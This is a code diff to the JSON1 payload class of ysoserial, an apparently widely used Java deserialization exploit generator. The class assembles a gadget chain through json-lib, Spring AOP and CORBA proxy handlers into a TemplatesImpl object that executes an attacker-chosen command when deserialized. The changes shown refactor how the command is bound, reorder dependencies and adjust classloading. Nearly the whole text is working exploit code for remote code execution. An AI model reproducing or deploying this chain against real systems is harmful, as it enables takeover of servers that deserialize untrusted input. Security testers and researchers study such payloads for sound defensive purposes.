@@ -1,6 +1,8 @@
 package ysoserial.payloads;
 
 
+import ysoserial.annotation.Bind;
+import ysoserial.interfaces.ObjectPayload;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
@@ -17,11 +19,12 @@ import javax.management.openmbean.OpenDataException;
 import javax.management.openmbean.OpenType;
 import javax.management.openmbean.TabularDataSupport;
 import javax.management.openmbean.TabularType;
-
 import javax.xml.transform.Templates;
 
 import org.springframework.aop.framework.AdvisedSupport;
+
 import com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl;
+
 import net.sf.json.JSONObject;
 
 
@@ -60,14 +63,23 @@ import net.sf.json.JSONObject;
     "rawtypes", "unchecked", "restriction"
 } )
 @Dependencies ( {
-    "net.sf.json-lib:json-lib:jar:jdk15:2.4", "org.springframework:spring-aop:4.1.4.RELEASE",
-    // deep deps
     "aopalliance:aopalliance:1.0", "commons-logging:commons-logging:1.2", "commons-lang:commons-lang:2.6", "net.sf.ezmorph:ezmorph:1.0.6",
-    "commons-beanutils:commons-beanutils:1.9.2", "org.springframework:spring-core:4.1.4.RELEASE", "commons-collections:commons-collections:3.1"
+    "commons-beanutils:commons-beanutils:1.9.2", "org.springframework:spring-core:4.1.4.RELEASE", "commons-collections:commons-collections:3.1",
+    "net.sf.json-lib:json-lib:jar:jdk15:2.4", "org.springframework:spring-aop:4.1.4.RELEASE"
 } )
 public class JSON1 implements ObjectPayload<Object> {
 
-    public Map getObject ( String command ) throws Exception {
+	@Bind private String command;
+	
+    /**
+	 * @deprecated Use {@link #getObject()} instead
+	 */
+	public Map getObject ( String command ) throws Exception {
+		return getObject();
+	}
+
+
+	public Map getObject ( ) throws Exception {
         return makeCallerChain(Gadgets.createTemplatesImpl(command), Templates.class);
     }
 
@@ -95,7 +107,7 @@ public class JSON1 implements ObjectPayload<Object> {
         AdvisedSupport as = new AdvisedSupport();
         as.setTarget(payload);
         InvocationHandler delegateInvocationHandler = (InvocationHandler) Reflections
-                .getFirstCtor("org.springframework.aop.framework.JdkDynamicAopProxy").newInstance(as);
+                .getFirstCtor("org.springframework.aop.framework.JdkDynamicAopProxy", JSON1.class.getClassLoader()).newInstance(as);
         InvocationHandler cdsInvocationHandler = Gadgets.createMemoizedInvocationHandler(Gadgets.createMap("getCompositeType", rt));
         CompositeInvocationHandlerImpl invocationHandler = new CompositeInvocationHandlerImpl();
         invocationHandler.addInvocationHandler(CompositeData.class, cdsInvocationHandler);
